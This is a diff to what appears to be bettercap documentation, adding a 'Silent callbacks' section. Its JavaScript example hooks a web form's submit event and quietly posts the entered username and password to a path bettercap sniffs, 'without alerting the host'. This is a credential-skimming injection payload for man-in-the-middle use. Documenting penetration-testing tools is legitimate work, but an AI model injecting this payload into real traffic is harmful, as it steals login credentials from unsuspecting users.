@@ -91,3 +91,20 @@ function jfIleNwmKoa() {
 
 jfIleNwmKoa()
 ```
+
+### Silent callbacks
+
+You can write a custom payload that communicates back to bettercap without alerting the host.
+
+Example of a silent callback:
+
+```js
+// This is a custom payload
+form.onsubmit = function() {
+  req = new XMLHttpRequest()
+  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
+  req.send()
+}
+```
+
+The following POST request will be sniffed by bettercap, but not proxied. This can save time when writing JavaScript payloads.
